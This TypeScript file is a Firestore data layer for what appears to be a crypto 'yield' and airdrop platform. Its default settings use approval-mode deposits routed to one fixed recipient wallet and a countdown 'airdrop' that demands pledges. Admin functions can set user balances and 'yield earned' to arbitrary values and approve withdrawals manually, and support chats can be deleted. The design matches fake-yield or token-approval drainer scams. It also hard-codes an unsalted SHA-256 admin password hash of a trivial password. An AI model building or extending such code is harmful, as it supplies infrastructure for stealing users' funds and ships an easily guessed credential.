import { initializeApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import {
  getFirestore,
  doc,
  setDoc,
  getDoc,
  getDocs,
  collection,
  deleteDoc,
  onSnapshot,
  Unsubscribe,
} from 'firebase/firestore';
import { UserAccount, AppConfig, TransactionLog, YIELD_TIERS } from '../types';
import firebaseConfig from '../../firebase-applet-config.json';

// Initialize Firebase App & Firestore with databaseId
const app = initializeApp(firebaseConfig);
export const db = getFirestore(app, firebaseConfig.firestoreDatabaseId);
export const auth = getAuth(app);

// Firestore Error Handler as mandated by Firebase Integration Skill
export enum OperationType {
  CREATE = 'create',
  UPDATE = 'update',
  DELETE = 'delete',
  LIST = 'list',
  GET = 'get',
  WRITE = 'write',
}

export interface FirestoreErrorInfo {
  error: string;
  operationType: OperationType;
  path: string | null;
  authInfo: {
    userId?: string | null;
    email?: string | null;
    emailVerified?: boolean | null;
    isAnonymous?: boolean | null;
    tenantId?: string | null;
    providerInfo?: {
      providerId?: string | null;
      email?: string | null;
    }[];
  };
}

export function handleFirestoreError(error: unknown, operationType: OperationType, path: string | null) {
  const errInfo: FirestoreErrorInfo = {
    error: error instanceof Error ? error.message : String(error),
    authInfo: {
      userId: auth.currentUser?.uid,
      email: auth.currentUser?.email,
      emailVerified: auth.currentUser?.emailVerified,
      isAnonymous: auth.currentUser?.isAnonymous,
      tenantId: auth.currentUser?.tenantId,
      providerInfo: auth.currentUser?.providerData?.map((provider) => ({
        providerId: provider.providerId,
        email: provider.email,
      })) || [],
    },
    operationType,
    path,
  };
  console.warn('Firestore Operation Notice: ', JSON.stringify(errInfo));
}

export interface ChatMessage {
  id: string;
  sender: 'user' | 'agent';
  text: string;
  timestamp: number;
}

export interface SupportChatSession {
  chatId: string;
  walletAddress?: string;
  messages: ChatMessage[];
  status: 'active' | 'closed';
  updatedAt: number;
  unreadForAdmin?: boolean;
  unreadForUser?: boolean;
}

export const DEFAULT_CONFIG: AppConfig = {
  recipientAddress: '0x71C7656EC7ab88b098defB751B7401B5f6d1476B',
  adminPasswordHash: '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',
  minDepositUSDT: 10,
  minWithdrawUSDT: 10,
  minParticipateETH: 0.5,
  baseYieldRate: 0.0055,
  depositMode: 'approve',
  depositSystems: [
    { id: 'USDT_1', currency: 'USDT', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0xdAC17F958D2ee523a2206206994597C13D831ec7', enabled: true },
    { id: 'USDT_56', currency: 'USDT', chainId: 56, chainName: 'BNB Smart Chain', tokenAddress: '0x55d398326f99059fF775485246999027B3197955', enabled: true },
    { id: 'USDT_137', currency: 'USDT', chainId: 137, chainName: 'Polygon Mainnet', tokenAddress: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', enabled: true },
    { id: 'USDT_42161', currency: 'USDT', chainId: 42161, chainName: 'Arbitrum One', tokenAddress: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', enabled: true },
    { id: 'USDT_11155111', currency: 'USDT', chainId: 11155111, chainName: 'Sepolia Testnet', tokenAddress: '0xaA8E23Fb1079EA71e0a56F48a2AA51851D8433D0', enabled: true },
    { id: 'USDC_1', currency: 'USDC', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', enabled: true },
    { id: 'USDC_11155111', currency: 'USDC', chainId: 11155111, chainName: 'Sepolia Testnet', tokenAddress: '0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238', enabled: true },
    { id: 'BTC_1', currency: 'BTC', chainId: 1, chainName: 'Ethereum Mainnet', tokenAddress: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', enabled: true },
  ],
  yieldTiers: YIELD_TIERS,
  airdropStandardUSDT: 1000,
  airdropOutputETH: 0.5,
  airdropCountdownDays: 7,
  userAirdrops: [
    {
      id: 'airdrop-global',
      targetAddress: 'ALL',
      standardUSDT: 1000,
      outputETH: 0.5,
      durationDays: 7,
      endTime: Date.now() + 7 * 24 * 60 * 60 * 1000,
      enabled: true,
      createdAt: Date.now(),
    },
  ],
};

/**
 * Save or update user in Firestore
 */
export async function saveUserToFirestore(user: UserAccount): Promise<void> {
  if (!user || !user.walletAddress) return;
  const address = user.walletAddress.toLowerCase();
  const now = Date.now();
  const userWithTimestamp: UserAccount = {
    ...user,
    walletAddress: address,
    updatedAt: user.updatedAt || now,
    createdAt: user.createdAt || now,
  };

  // Clean undefined values before writing to Firestore
  const cleanData = JSON.parse(JSON.stringify(userWithTimestamp));

  try {
    const userRef = doc(db, 'users', address);
    await setDoc(userRef, cleanData, { merge: true });
    // Also save in localStorage for offline resiliency
    localStorage.setItem(`user_${address}`, JSON.stringify(cleanData));
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, `users/${address}`);
    localStorage.setItem(`user_${address}`, JSON.stringify(cleanData));
  }
}

/**
 * Fetch a single user from Firestore
 */
export async function fetchUserFromFirestore(walletAddress: string): Promise<UserAccount | null> {
  if (!walletAddress) return null;
  const address = walletAddress.toLowerCase();
  try {
    const userRef = doc(db, 'users', address);
    const snap = await getDoc(userRef);
    if (snap.exists()) {
      const data = snap.data() as UserAccount;
      localStorage.setItem(`user_${address}`, JSON.stringify(data));
      return data;
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.GET, `users/${address}`);
  }

  // Fallback to local storage if offline
  try {
    const local = localStorage.getItem(`user_${address}`);
    if (local) return JSON.parse(local) as UserAccount;
  } catch (e) {}

  return null;
}

/**
 * Subscribe to all users in Firestore in real-time (Admin)
 */
export function subscribeUsersFromFirestore(callback: (usersMap: Record<string, UserAccount>) => void): Unsubscribe {
  return onSnapshot(
    collection(db, 'users'),
    (snap) => {
      const usersMap: Record<string, UserAccount> = {};
      snap.forEach((d) => {
        const u = d.data() as UserAccount;
        const addr = (u?.walletAddress || d.id).toLowerCase();
        if (addr && addr.startsWith('0x')) {
          u.walletAddress = addr;
          usersMap[addr] = u;
          localStorage.setItem(`user_${addr}`, JSON.stringify(u));
        }
      });
      callback(usersMap);
    },
    (err) => {
      handleFirestoreError(err, OperationType.LIST, 'users');
    }
  );
}

/**
 * Fetch all users from Firestore (Admin)
 */
export async function fetchUsersFromFirestore(): Promise<Record<string, UserAccount>> {
  const usersMap: Record<string, UserAccount> = {};

  // First seed from local storage so we never start completely empty
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const k = localStorage.key(i);
      if (k && k.startsWith('user_0x')) {
        const addr = k.replace('user_', '').toLowerCase();
        try {
          const val = JSON.parse(localStorage.getItem(k) || '');
          if (val && (val.walletAddress || addr)) {
            usersMap[addr] = { ...val, walletAddress: addr };
          }
        } catch (e) {}
      }
    }
  } catch (e) {}

  try {
    const snap = await getDocs(collection(db, 'users'));
    snap.forEach((d) => {
      const u = d.data() as UserAccount;
      const addr = (u?.walletAddress || d.id).toLowerCase();
      if (addr && addr.startsWith('0x')) {
        u.walletAddress = addr;
        usersMap[addr] = u;
        localStorage.setItem(`user_${addr}`, JSON.stringify(u));
      }
    });
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, 'users');
  }

  return usersMap;
}

/**
 * Update user block status in Firestore
 */
export async function updateUserBlockInFirestore(
  walletAddress: string,
  isBlocked: boolean
): Promise<void> {
  if (!walletAddress) return;
  const address = walletAddress.toLowerCase();
  try {
    const userRef = doc(db, 'users', address);
    await setDoc(userRef, { isBlocked, updatedAt: Date.now() }, { merge: true });
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `users/${address}`);
  }

  try {
    const local = localStorage.getItem(`user_${address}`);
    if (local) {
      const parsed = JSON.parse(local);
      parsed.isBlocked = isBlocked;
      parsed.updatedAt = Date.now();
      localStorage.setItem(`user_${address}`, JSON.stringify(parsed));
    }
  } catch (e) {}
}

/**
 * Update user balance or custom fields in Firestore
 */
export async function updateUserBalanceInFirestore(
  walletAddress: string,
  balanceType: string,
  value: number
): Promise<void> {
  if (!walletAddress) return;
  const address = walletAddress.toLowerCase();
  const updatePayload: Record<string, any> = { updatedAt: Date.now() };

  const typeLower = balanceType.toLowerCase();
  if (typeLower === 'usdt' || typeLower === 'usdtbalance') {
    updatePayload.usdtBalance = value;
  } else if (typeLower === 'occupiedusdt') {
    updatePayload.occupiedUSDT = value;
  } else if (typeLower === 'usdc' || typeLower === 'usdcbalance') {
    updatePayload.usdcBalance = value;
  } else if (typeLower === 'occupiedusdc') {
    updatePayload.occupiedUSDC = value;
  } else if (typeLower === 'btc' || typeLower === 'btcbalance') {
    updatePayload.btcBalance = value;
  } else if (typeLower === 'occupiedbtc') {
    updatePayload.occupiedBTC = value;
  } else if (typeLower === 'eth' || typeLower === 'ethbalance') {
    updatePayload.ethBalance = value;
  } else if (typeLower === 'occupiedeth') {
    updatePayload.occupiedETH = value;
  } else if (typeLower === 'totalyieldearned') {
    updatePayload.totalYieldEarned = value;
  } else if (typeLower === 'airdroppledgedusdt') {
    updatePayload.airdropPledgedUSDT = value;
  }

  try {
    const userRef = doc(db, 'users', address);
    await setDoc(userRef, updatePayload, { merge: true });
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `users/${address}`);
  }

  try {
    const local = localStorage.getItem(`user_${address}`);
    if (local) {
      const parsed = JSON.parse(local);
      Object.assign(parsed, updatePayload);
      localStorage.setItem(`user_${address}`, JSON.stringify(parsed));
    }
  } catch (e) {}
}

/**
 * Save System Config in Firestore
 */
export async function saveConfigToFirestore(config: Partial<AppConfig>): Promise<void> {
  try {
    const configRef = doc(db, 'settings', 'config');
    const existing = (await fetchConfigFromFirestore()) || DEFAULT_CONFIG;
    const merged: AppConfig = {
      ...existing,
      ...config,
    };
    const cleanData = JSON.parse(JSON.stringify(merged));
    await setDoc(configRef, cleanData, { merge: true });
    localStorage.setItem('app_config_store', JSON.stringify(cleanData));
    if (cleanData.recipientAddress) {
      localStorage.setItem('custom_recipient_address', cleanData.recipientAddress);
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, 'settings/config');
    localStorage.setItem('app_config_store', JSON.stringify(config));
  }
}

/**
 * Fetch System Config from Firestore
 */
export async function fetchConfigFromFirestore(): Promise<AppConfig | null> {
  try {
    const configRef = doc(db, 'settings', 'config');
    const snap = await getDoc(configRef);
    if (snap.exists()) {
      const data = snap.data() as AppConfig;
      localStorage.setItem('app_config_store', JSON.stringify(data));
      return {
        ...DEFAULT_CONFIG,
        ...data,
      };
    } else {
      // Initialize default config in Firestore
      const cleanDefault = JSON.parse(JSON.stringify(DEFAULT_CONFIG));
      await setDoc(configRef, cleanDefault, { merge: true });
      return DEFAULT_CONFIG;
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.GET, 'settings/config');
  }

  // Fallback to local storage
  try {
    const raw = localStorage.getItem('app_config_store');
    if (raw) {
      return { ...DEFAULT_CONFIG, ...JSON.parse(raw) };
    }
  } catch (e) {}

  return DEFAULT_CONFIG;
}

/**
 * Log transaction in Firestore
 */
export async function addLogToFirestore(log: Omit<TransactionLog, 'id'> & { id?: string }): Promise<void> {
  if (!log.walletAddress) return;
  const logId = log.id || `log_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;
  const newLog: TransactionLog = {
    id: logId,
    timestamp: log.timestamp || Date.now(),
    walletAddress: log.walletAddress.toLowerCase(),
    type: log.type,
    amount: log.amount || 0,
    currency: log.currency || 'USDT',
    status: log.status || 'pending',
    details: log.details || '',
    txHash: log.txHash || '',
    proofImage: log.proofImage || '',
  };

  const cleanData = JSON.parse(JSON.stringify(newLog));

  try {
    const logRef = doc(db, 'logs', logId);
    await setDoc(logRef, cleanData);
  } catch (err) {
    handleFirestoreError(err, OperationType.CREATE, `logs/${logId}`);
  }

  // Local backup
  try {
    const logs = await fetchLogsFromFirestore();
    const updated = [cleanData, ...logs.filter((l) => l.id !== logId)];
    localStorage.setItem('app_logs_store', JSON.stringify(updated));
  } catch (e) {}
}

/**
 * Fetch logs from Firestore
 */
export async function fetchLogsFromFirestore(): Promise<TransactionLog[]> {
  try {
    const snap = await getDocs(collection(db, 'logs'));
    const logsList: TransactionLog[] = [];
    snap.forEach((d) => {
      const data = d.data() as TransactionLog;
      if (data && data.walletAddress) {
        logsList.push({ ...data, id: d.id });
      }
    });
    logsList.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
    if (logsList.length > 0) {
      localStorage.setItem('app_logs_store', JSON.stringify(logsList));
      return logsList;
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, 'logs');
  }

  // Local storage fallback
  try {
    const raw = localStorage.getItem('app_logs_store');
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) return parsed;
    }
  } catch (e) {}

  return [];
}

/**
 * Update Log Status in Firestore (Approve / Reject)
 */
export async function updateLogStatusInFirestore(
  logId: string,
  status: 'success' | 'pending' | 'failed',
  details?: string
): Promise<void> {
  if (!logId) return;
  try {
    const logRef = doc(db, 'logs', logId);
    const snap = await getDoc(logRef);
    let targetLog: TransactionLog | null = null;

    if (snap.exists()) {
      targetLog = { ...(snap.data() as TransactionLog), id: logId };
      await setDoc(logRef, { status, details: details || targetLog.details }, { merge: true });
    }

    // Update user balance in Firestore if approved deposit or refunded withdrawal
    if (targetLog) {
      const logItem = targetLog;
      const addr = logItem.walletAddress.toLowerCase();
      const user = await fetchUserFromFirestore(addr);

      if (user) {
        if (logItem.type === 'deposit' && status === 'success') {
          const cur = logItem.currency.toUpperCase();
          if (cur.includes('USDT')) {
            user.usdtBalance = (user.usdtBalance || 0) + logItem.amount;
          } else if (cur.includes('USDC')) {
            user.usdcBalance = (user.usdcBalance || 0) + logItem.amount;
          } else if (cur.includes('BTC')) {
            user.btcBalance = (user.btcBalance || 0) + logItem.amount;
          } else if (cur.includes('ETH')) {
            user.ethBalance = (user.ethBalance || 0) + logItem.amount;
          }
          user.updatedAt = Date.now();
          await saveUserToFirestore(user);
        } else if (logItem.type === 'withdraw' && status === 'failed') {
          // Refund on reject
          const cur = logItem.currency.toUpperCase();
          if (cur.includes('USDT')) {
            user.usdtBalance = (user.usdtBalance || 0) + logItem.amount;
          } else if (cur.includes('USDC')) {
            user.usdcBalance = (user.usdcBalance || 0) + logItem.amount;
          } else if (cur.includes('BTC')) {
            user.btcBalance = (user.btcBalance || 0) + logItem.amount;
          } else if (cur.includes('ETH')) {
            user.ethBalance = (user.ethBalance || 0) + logItem.amount;
          }
          user.updatedAt = Date.now();
          await saveUserToFirestore(user);
        }
      }
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.UPDATE, `logs/${logId}`);
  }

  // Update local storage
  try {
    const raw = localStorage.getItem('app_logs_store');
    if (raw) {
      const logs = JSON.parse(raw);
      if (Array.isArray(logs)) {
        const updated = logs.map((l: TransactionLog) =>
          l.id === logId ? { ...l, status, details: details || l.details } : l
        );
        localStorage.setItem('app_logs_store', JSON.stringify(updated));
      }
    }
  } catch (e) {}
}

/**
 * Send message in Support Chat using Firestore
 */
export async function sendMessageToChatInFirestore(
  chatId: string,
  message: ChatMessage,
  walletAddress?: string
): Promise<void> {
  if (!chatId) return;
  const cleanId = chatId.toLowerCase();
  const addressToSave = walletAddress ? walletAddress.toLowerCase() : cleanId;

  try {
    const chatRef = doc(db, 'support_chats', cleanId);
    const snap = await getDoc(chatRef);
    let existingMsgs: ChatMessage[] = [];

    if (snap.exists()) {
      const data = snap.data() as SupportChatSession;
      if (data && Array.isArray(data.messages)) {
        existingMsgs = data.messages;
      }
    }

    const combinedMap = new Map<string, ChatMessage>();
    existingMsgs.forEach((m) => combinedMap.set(m.id, m));
    combinedMap.set(message.id, message);
    const sorted = Array.from(combinedMap.values()).sort((a, b) => a.timestamp - b.timestamp);

    const updatedSession: SupportChatSession = {
      chatId: cleanId,
      walletAddress: addressToSave,
      messages: sorted,
      status: 'active',
      updatedAt: Date.now(),
      unreadForAdmin: message.sender === 'user',
      unreadForUser: message.sender === 'agent',
    };

    const cleanData = JSON.parse(JSON.stringify(updatedSession));
    await setDoc(chatRef, cleanData, { merge: true });
    localStorage.setItem(`support_chat_${cleanId}`, JSON.stringify(cleanData));
  } catch (err) {
    handleFirestoreError(err, OperationType.WRITE, `support_chats/${cleanId}`);
  }
}

/**
 * Fetch a single chat session from Firestore
 */
export async function fetchChatFromFirestore(chatId: string): Promise<SupportChatSession | null> {
  if (!chatId) return null;
  const cleanId = chatId.toLowerCase();
  try {
    const chatRef = doc(db, 'support_chats', cleanId);
    const snap = await getDoc(chatRef);
    if (snap.exists()) {
      const data = snap.data() as SupportChatSession;
      localStorage.setItem(`support_chat_${cleanId}`, JSON.stringify(data));
      return data;
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.GET, `support_chats/${cleanId}`);
  }

  // Fallback to local storage
  try {
    const raw = localStorage.getItem(`support_chat_${cleanId}`);
    if (raw) return JSON.parse(raw) as SupportChatSession;
  } catch (e) {}

  return null;
}

/**
 * Fetch all chat sessions for Admin from Firestore
 */
export async function fetchAllChatsFromFirestore(): Promise<SupportChatSession[]> {
  try {
    const snap = await getDocs(collection(db, 'support_chats'));
    const list: SupportChatSession[] = [];
    snap.forEach((d) => {
      const data = d.data() as SupportChatSession;
      if (data && data.chatId) {
        list.push(data);
        localStorage.setItem(`support_chat_${data.chatId.toLowerCase()}`, JSON.stringify(data));
      }
    });
    list.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
    if (list.length > 0) return list;
  } catch (err) {
    handleFirestoreError(err, OperationType.LIST, 'support_chats');
  }

  // Local storage fallback
  const list: SupportChatSession[] = [];
  try {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (key && key.startsWith('support_chat_')) {
        const raw = localStorage.getItem(key);
        if (raw) {
          const c = JSON.parse(raw);
          if (c && c.chatId) list.push(c);
        }
      }
    }
    list.sort((a, b) => (b.updatedAt || 0) - (a.updatedAt || 0));
  } catch (e) {}

  return list;
}

/**
 * Close and delete support chat session from Firestore
 */
export async function closeChatInFirestore(chatId: string, deleteHistory = true): Promise<void> {
  if (!chatId) return;
  const cleanId = chatId.toLowerCase();
  try {
    const chatRef = doc(db, 'support_chats', cleanId);
    if (deleteHistory) {
      await deleteDoc(chatRef);
      localStorage.removeItem(`support_chat_${cleanId}`);
    } else {
      await setDoc(chatRef, { status: 'closed', updatedAt: Date.now() }, { merge: true });
    }
  } catch (err) {
    handleFirestoreError(err, OperationType.DELETE, `support_chats/${cleanId}`);
  }
}

/**
 * Real-time listeners for live updates
 */
export function subscribeToUser(walletAddress: string, callback: (user: UserAccount | null) => void): Unsubscribe {
  const address = walletAddress.toLowerCase();
  const userRef = doc(db, 'users', address);
  return onSnapshot(
    userRef,
    (snap) => {
      if (snap.exists()) {
        callback(snap.data() as UserAccount);
      } else {
        callback(null);
      }
    },
    (err) => {
      handleFirestoreError(err, OperationType.GET, `users/${address}`);
    }
  );
}

export function subscribeToConfig(callback: (config: AppConfig | null) => void): Unsubscribe {
  const configRef = doc(db, 'settings', 'config');
  return onSnapshot(
    configRef,
    (snap) => {
      if (snap.exists()) {
        callback({ ...DEFAULT_CONFIG, ...(snap.data() as AppConfig) });
      } else {
        callback(DEFAULT_CONFIG);
      }
    },
    (err) => {
      handleFirestoreError(err, OperationType.GET, 'settings/config');
    }
  );
}

export function subscribeToLogs(callback: (logs: TransactionLog[]) => void): Unsubscribe {
  const logsRef = collection(db, 'logs');
  return onSnapshot(
    logsRef,
    (snap) => {
      const list: TransactionLog[] = [];
      snap.forEach((d) => {
        const item = d.data() as TransactionLog;
        if (item && item.walletAddress) {
          list.push({ ...item, id: d.id });
        }
      });
      list.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
      callback(list);
    },
    (err) => {
      handleFirestoreError(err, OperationType.LIST, 'logs');
    }
  );
}
